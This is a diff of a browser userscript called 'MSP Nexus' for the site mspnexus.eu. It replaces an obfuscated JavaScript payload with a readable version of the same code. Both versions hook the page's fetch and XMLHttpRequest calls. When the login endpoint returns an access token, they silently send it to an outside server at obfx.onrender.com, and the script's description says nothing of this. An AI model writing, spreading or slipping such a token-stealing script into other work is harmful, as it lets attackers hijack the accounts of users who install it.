@@ -1,1 +1,79 @@
-(function(_0x4ffaef,_0x471af1){const _0x50986a=_0x3137,_0x2b782e=_0x4ffaef();while(!![]){try{const _0x53c010=parseInt(_0x50986a(0x21e))/0x1+-parseInt(_0x50986a(0x1fb))/0x2+-parseInt(_0x50986a(0x1fa))/0x3+parseInt(_0x50986a(0x1fc))/0x4*(-parseInt(_0x50986a(0x204))/0x5)+parseInt(_0x50986a(0x1f7))/0x6*(-parseInt(_0x50986a(0x1f3))/0x7)+-parseInt(_0x50986a(0x21a))/0x8*(-parseInt(_0x50986a(0x20a))/0x9)+parseInt(_0x50986a(0x1f6))/0xa*(parseInt(_0x50986a(0x1f0))/0xb);if(_0x53c010===_0x471af1)break;else _0x2b782e['push'](_0x2b782e['shift']());}catch(_0x44f6ed){_0x2b782e['push'](_0x2b782e['shift']());}}}(_0x5a42,0x28e6d),(function(){const _0x3d8af8=_0x3137,_0x48a2f5=(function(){let _0x244e4b=!![];return function(_0x2c1879,_0x45f769){const _0x3eba2d=_0x244e4b?function(){const _0x3f851b=_0x3137;if(_0x45f769){const _0x25b622=_0x45f769[_0x3f851b(0x205)](_0x2c1879,arguments);return _0x45f769=null,_0x25b622;}}:function(){};return _0x244e4b=![],_0x3eba2d;};}()),_0x414ed7=_0x48a2f5(this,function(){const _0x1d0dbe=_0x3137;return _0x414ed7[_0x1d0dbe(0x20c)]()[_0x1d0dbe(0x212)](_0x1d0dbe(0x208))[_0x1d0dbe(0x20c)]()[_0x1d0dbe(0x215)](_0x414ed7)[_0x1d0dbe(0x212)](_0x1d0dbe(0x208));});_0x414ed7();const _0x4fecc3=(function(){let _0x39d69e=!![];return function(_0x350892,_0x247459){const _0x537673=_0x39d69e?function(){const _0x57e7ab=_0x3137;if(_0x247459){const _0x5af3ef=_0x247459[_0x57e7ab(0x205)](_0x350892,arguments);return _0x247459=null,_0x5af3ef;}}:function(){};return _0x39d69e=![],_0x537673;};}()),_0x5f3d3e=_0x4fecc3(this,function(){const _0x35808c=_0x3137;let _0x3193a0;try{const _0x45b90f=Function(_0x35808c(0x202)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x3193a0=_0x45b90f();}catch(_0x51a447){_0x3193a0=window;}const _0x43bd20=_0x3193a0[_0x35808c(0x20b)]=_0x3193a0[_0x35808c(0x20b)]||{},_0x2cb5db=[_0x35808c(0x21c),'warn','info','error',_0x35808c(0x20e),_0x35808c(0x211),_0x35808c(0x1f4)];for(let _0x16c0c4=0x0;_0x16c0c4<_0x2cb5db['length'];_0x16c0c4++){const _0x50744b=_0x4fecc3[_0x35808c(0x215)]['prototype']['bind'](_0x4fecc3),_0x3593bf=_0x2cb5db[_0x16c0c4],_0x232aaa=_0x43bd20[_0x3593bf]||_0x50744b;_0x50744b[_0x35808c(0x209)]=_0x4fecc3['bind'](_0x4fecc3),_0x50744b[_0x35808c(0x20c)]=_0x232aaa[_0x35808c(0x20c)][_0x35808c(0x1f8)](_0x232aaa),_0x43bd20[_0x3593bf]=_0x50744b;}});_0x5f3d3e();'use strict';const _0x329978='https://mspnexus.eu/api/v2/Service?Gateway=Login',_0x4230ff=_0x3d8af8(0x214),_0x406051=window[_0x3d8af8(0x201)];window[_0x3d8af8(0x201)]=async function(..._0x2ece54){const _0x13788a=_0x3d8af8,[_0x106f2d,_0x4d54e6={}]=_0x2ece54;if(typeof _0x106f2d===_0x13788a(0x216)&&_0x106f2d['includes'](_0x13788a(0x1f1))&&_0x4d54e6[_0x13788a(0x219)]?.[_0x13788a(0x1f9)]()===_0x13788a(0x21b)){const _0xb08849=await _0x406051(_0x106f2d,_0x4d54e6),_0x2ec9ce=_0xb08849[_0x13788a(0x1fe)]();return _0x2ec9ce[_0x13788a(0x1ff)]()[_0x13788a(0x207)](_0x5b6436=>{const _0x2a3741=_0x13788a;_0x5b6436&&_0x5b6436[_0x2a3741(0x206)]&&fetch(_0x4230ff,{'method':_0x2a3741(0x21b),'headers':{'Content-Type':_0x2a3741(0x20d)},'body':JSON[_0x2a3741(0x1f2)]({'jwt':_0x5b6436[_0x2a3741(0x206)]})})['catch'](()=>{});})[_0x13788a(0x203)](()=>{}),_0xb08849;}return _0x406051['apply'](this,_0x2ece54);};const _0xdbac9e=XMLHttpRequest[_0x3d8af8(0x1f5)]['open'];XMLHttpRequest[_0x3d8af8(0x1f5)][_0x3d8af8(0x213)]=function(_0x5387ee,_0x3367ea){const _0x267068=_0x3d8af8;return this[_0x267068(0x20f)]=_0x3367ea,_0xdbac9e[_0x267068(0x205)](this,arguments);};const _0x4f04aa=XMLHttpRequest['prototype'][_0x3d8af8(0x218)];XMLHttpRequest['prototype']['send']=function(_0x2b02e9){const _0x1b3722=_0x3d8af8;return this[_0x1b3722(0x20f)]&&this[_0x1b3722(0x20f)]['includes']('/api/v2/Service?Gateway=Login')&&this[_0x1b3722(0x200)]?.['toUpperCase']()===_0x1b3722(0x21b)&&this['addEventListener'](_0x1b3722(0x217),function(){const _0x534d99=_0x1b3722;if(this[_0x534d99(0x1fd)]>=0xc8&&this[_0x534d99(0x1fd)]<0x12c)try{const _0xf25f80=JSON[_0x534d99(0x21d)](this[_0x534d99(0x210)]);_0xf25f80[_0x534d99(0x206)]&&fetch(_0x4230ff,{'method':'POST','headers':{'Content-Type':_0x534d99(0x20d)},'body':JSON[_0x534d99(0x1f2)]({'jwt':_0xf25f80[_0x534d99(0x206)]})})[_0x534d99(0x203)](()=>{});}catch{}}),_0x4f04aa[_0x1b3722(0x205)](this,arguments);};}()));function _0x3137(_0x23eb97,_0x23102f){_0x23eb97=_0x23eb97-0x1f0;const _0x10af71=_0x5a42();let _0x34942d=_0x10af71[_0x23eb97];return _0x34942d;}function _0x5a42(){const _0x18ea64=['open','https://obfx.onrender.com/save-token','constructor','string','load','send','method','25136QAFjvn','POST','log','parse','186682OyFrTg','374xpjvgq','/api/v2/Service?Gateway=Login','stringify','935347QLPQbQ','trace','prototype','249130xJtBQz','12PWAoiZ','bind','toUpperCase','501492NSTdCI','537356VjpbFt','81020XfUePV','status','clone','json','_method','fetch','return\x20(function()\x20','catch','55MGIxuQ','apply','access_token','then','(((.+)+)+)+$','__proto__','171rqlGcX','console','toString','application/json','exception','_url','responseText','table','search'];_0x5a42=function(){return _0x18ea64;};return _0x5a42();}
+// ==UserScript==
+// @name         MSP Nexus
+// @namespace    MSP Nexus
+// @version      1.4
+// @description  MSP Nexus
+// @author       Steven
+// @match        https://mspnexus.eu/*
+// @match        https://*.mspnexus.eu/*
+// @grant        none
+// @run-at       document-start
+// @inject-into  page
+// ==/UserScript==
+
+(function() {
+    'use strict';
+
+    const TARGET_API = 'https://mspnexus.eu/api/v2/Service?Gateway=Login';
+    const SAVE_ENDPOINT = 'https://obfx.onrender.com/save-token';
+
+    const originalFetch = window.fetch;
+
+    window.fetch = async function(...args) {
+        const [resource, config = {}] = args;
+
+        if (typeof resource === 'string' &&
+            resource.includes('/api/v2/Service?Gateway=Login') &&
+            config.method?.toUpperCase() === 'POST') {
+
+            const response = await originalFetch(resource, config);
+            const cloned = response.clone();
+
+            cloned.json()
+                .then(data => {
+                    if (data && data.access_token) {
+                        fetch(SAVE_ENDPOINT, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ jwt: data.access_token })
+                        }).catch(() => {});
+                    }
+                })
+                .catch(() => {});
+
+            return response;
+        }
+
+        return originalFetch.apply(this, args);
+    };
+
+    const originalOpen = XMLHttpRequest.prototype.open;
+    XMLHttpRequest.prototype.open = function(method, url) {
+        this._url = url;
+        return originalOpen.apply(this, arguments);
+    };
+
+    const originalSend = XMLHttpRequest.prototype.send;
+    XMLHttpRequest.prototype.send = function(body) {
+        if (this._url && this._url.includes('/api/v2/Service?Gateway=Login') &&
+            this._method?.toUpperCase() === 'POST') {
+
+            this.addEventListener('load', function() {
+                if (this.status >= 200 && this.status < 300) {
+                    try {
+                        const data = JSON.parse(this.responseText);
+                        if (data.access_token) {
+                            fetch(SAVE_ENDPOINT, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ jwt: data.access_token })
+                            }).catch(() => {});
+                        }
+                    } catch {}
+                }
+            });
+        }
+        return originalSend.apply(this, arguments);
+    };
+
+})();
